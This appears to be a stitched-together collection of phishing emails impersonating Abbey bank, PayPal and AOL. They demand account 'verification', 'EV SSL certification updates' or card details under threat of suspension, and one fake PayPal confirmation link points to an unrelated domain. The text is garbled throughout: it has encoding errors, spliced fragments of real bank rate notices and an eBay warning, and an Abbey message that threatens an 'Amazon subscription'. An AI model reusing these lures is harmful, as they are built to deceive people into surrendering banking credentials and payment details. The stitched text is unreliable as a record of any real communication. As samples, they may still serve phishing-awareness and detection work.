Abbey<br />

PART OF THE SANTANDER GROUP<br />

Dear valued Abbey® Customer,<br />

Due to recent fraudulent transactions, we have issued the following security requirements.<br />

It has come to our attention that 98% of all fraudulent transactions are caused by members using stolen abbey online banking accounts. Thus we require our members to verify their account records as part of our continuing commitment to protect your account and to reduce the instance of fraud on our website. Your online account will only be used to identify you. If you could please take 5-10 minutes out of your online experience and renew your records you will not run into any future problems with the AbbeyR service. However, failure to confirm your records will result in your account suspension.<br />

We are requesting this information to verify and protect your identity. Federal regulations require all financial institutions to obtain, verify, and record identification from all persons opening new accounts or obtaining ongoing payment services. This is in order to prevent the use of the U.K. banking system in terrorist and other illegal activity. For these reasons, Abbey® will utilize services provided by various credit reporting agencies to verify the information you submit to us.<br />

Once you have updated your account records your pending Abbey® account transactions will not be interrupted and will continue as normal.<br />

To update your billing records please proceed to our secure webform by clicking here.<br />

Thank you for your time,<br />

Your account confirmation may go wrong if your credit card/bank account has expired, or if you have changed/replaced your credit card without letting us know about the change.<br />

Your account is not suspended, but if in 24 hours after you receive this message your account is not confirmed we will terminate your Amazon subscription.<br />

Card Reader Security<br />

We have to constantly develop our Internet Banking security to combat the increasingly sophisticated methods used by today&#039;s fraudsters. One of the latest methods involves installing a virus or Trojan onto a customers PC.<br />

To help our customers stay safe online weâ€TMve introduced Card Reader security. In conjunction with up to date anti virus and firewall software this new technology will help to:<br />

Log in security<br />

Although we ask for your entire Customer Number, we only ask for a random portion of your PIN and password. If a fraudster was able to record or see the responses you enter, they would still find it difficult to gain unauthorised access to your account.<br />

Thanks<br />

SSL Certification Update<br />

EV<br />

Dear Abbey Member,<br />

Due to the high number of fraud attempts and phishing scams, it has been decided to implement EV<br />

SSL Certification on this Internet Banking website.<br />

The use of EV SSL certification works with high security Web browsers to clearly identify whether<br />

the site belongs to the company or is another site imitating that company&#039;s site.<br />

It has been introduced to protect our clients against phishing and other online fraudulent activities.<br />

Since most Internet related crimes rely on false identity, Abbey went through a rigorous validation<br />

process that meets the Extended Validation guidelines.<br />

Please Update your account to the new EV SSL certification by Clicking here.<br />

Dear Valued Customer,<br />

You may have noticed that some limitations have been placed on your PayPalaccount. As a valued PayPal customer we are sending you this email to let youknow what this means to you and to ensure a speedy resolution is reached.<br />

What does it mean to have limited access? You will notice that certainoptions are now unavailable. This means you may no longer be able to do some ofthe following:<br />

• Send money to other PayPal users<br />

• Request or receive money from other users • Edit or remove account details<br />

• Close your PayPal account<br />

An account may be limited for a variety reasons. When you log into your account, you will find the reason behind the decision to limit your account.Possible reasons could include:<br />

• Merchandise issues e.g. if we receive excessive<br />

complaints about goods not turning up, or arriving but being significantly not as described.<br />

• Violations of PayPal&#039;s User Agreement or Acceptable Use Policy e.g. if the use of an account is not in keeping with our terms and conditions, it may be limited while a review is conducted.<br />

The limitation process helps to maintain PayPal as a safer, easier way tobuy and sell. The process is similar to passing through a security checkpointand being asked to show identification. When we limit an account we<br />

oftensimply ask the user to supply information to verify their identity, financialinformation or the merchandise they are selling.<br />

How do I resolve the issue? To assist us in our review, please follow thesesteps:<br />

• Log in to your PayPal account here<br />

• In your Account Overview, click on the Resolution Centre<br />

• Click on the &#039;Steps to Review Limitation&#039; link • Complete all steps listed in the &#039;Steps to Review Limitation&#039; table<br />

PayPal aims to review account information within 48 hours* so please aim toget the information to us as soon as you can. PayPal *Reviews are performed inthe order they are received.<br />

The maximum investment amount is £2,000,000. Deposits of more than £2,000,000 will receive a variable rate of 2.00% gross p.a./AER annually and 2.00% AER (1.97% gross p.a.) monthly.<br />

***These rates are variable and correct as at 8th December 2008. The AER assumes that the deposit was made on 1 January 2009. From 1 May 2009 you will receive the rate applicable to balances from £1 on all the money in your account.<br />

Please note that the tier of interest above, that is applicable to the balance of your account, is applied to the total balance. Quoted rates are for interest paid annually. Monthly interest rates are available on request and on our rates and fees page.<br />

**Whilst we aim to provide 24 hour access to your accounts this service may very occasionally be reduced, for example when improvements/updates are made to the site.<br />

Do not respond to the sender if this message requests that you complete the transaction outside of eBay.

Dear Abbey Bank plc Member,<br />

Due to the high number of fraud attempts and phishing scams, it has been decided to implement EV<br />

SSL Certification on this Internet Banking website.<br />

The use of EV SSL certification works with high security Web browsers to clearly identify whether<br />

the site belongs to the company or is another site imitating that company&#039;s site.<br />

It has been introduced to protect our clients against phishing and other online fraudulent activities.<br />

Since most Internet related crimes rely on false identity, Abbey Bank plc went through a rigorous validation<br />

process that meets the Extended Validation guidelines.<br />

Please Update your account to the new EV SSL certification by Re-Verify Your Account Details.<br />

(Failure to verify account details correctly will lead to account suspension)<br />

Thank you.<br />

Your account access has been limited for the following reason(s):<br />

1. We would like to ensure that your account was not accessed by an unauthorized third<br />

party.<br />

Because protecting the security of your account is our primary concern, we have limited<br />

access to sensitive Pay Pal account features.<br />

2. Unusual account activity has made it necessary to limit account access until additional<br />

verification information can be collected.<br />

3. If your account was hijacked, the PayPal account attached is vulnerable too. Please<br />

respond<br />

as soon as possible!<br />

Pay Pal Confirmation link:<br />

http://www.supplementsolutions.com/cart/lists/update-pay-pal/index.php<br />

Once you complete all of the checklist items, your case will be reviewed by one of our<br />

Account Specialists.<br />

We will send you an email with the outcome of the review. If, after reviewing your PayPal account information, you seek further clarification<br />

regarding your<br />

account access,<br />

please contact Pay Pal Online Banking by visiting the Help Center and clicking &quot;Contact<br />

Bill<br />

Important Message Regarding Your AOL Bill<br />

Your AOL (UK) Ltd account is in arrears. Updated payment details required.<br />

Dear Customer,<br />

We recently tried to collect payment for your AOL Security Suite powered by McAfee subscription from your account, however the transaction has been declined. In order to continue with your monthly subscription, we need you to update your payment details online within the next 10 days.<br />

Please note this change in payment is only required for your AOL Security Suite powered by McAfee service payment to AOL (UK) Ltd, and does NOT affect your payment for AOL Broadband or telephone services provided to you by The TalkTalk Group<br />

What you need to do<br />

You will need to update your payment details within the next 10 days to avoid any interruption to your AOL Security Suite protection. You can do this by logging into the secure My Account area here or cut and paste this link into your internet browser http://myaccount.aol.com/en-gb<br />

Enter your AOL Screen Name, password and answer your AOL security question to gain access to your My Account area and click on the Payment Method link on the left to update your payment details.<br />

You can also update your payment method by logging on to the AOL software and going to AOL Keyword: Billing<br />

Under the &quot;Manage My Account€TM section, click on &quot;AOL Paid Services Account€TM and then # Update Payment Detailsâ€TM and enter your current credit or debit card details.<br />

Please note that by updating your payment details we will collect the outstanding arrears on your account immediately. Once your account payments are up to date we will continue to collect your monthly subscription fee from you on your regular billing date.<br />

Just as a reminder changing your payment details for your AOL Security Suite subscription will not change or update the details you use to pay for AOL Broadband or telephone services that are provided to you by The TalkTalk Group. For your information, on your bank statement you will see that we collect your monthly subscription to AOL Security Suite under the reference &#039;AOL (UK) Ltd&#039;.<br />

What will happen if you don€TMt update your payment details?<br />

If you don€TMt update your payment details in the next 10 days you risk losing your AOL Security Suite powered by McAfee. This could leave your PC vulnerable to destructive viruses and other internet invaders. Without complete protection, you could lose important documents, irreplaceable photos, music and anything else stored on your computer. Itâ€TMs as important as the lock on your front door.<br />

If you have any questions at all, please click here or visit<br />
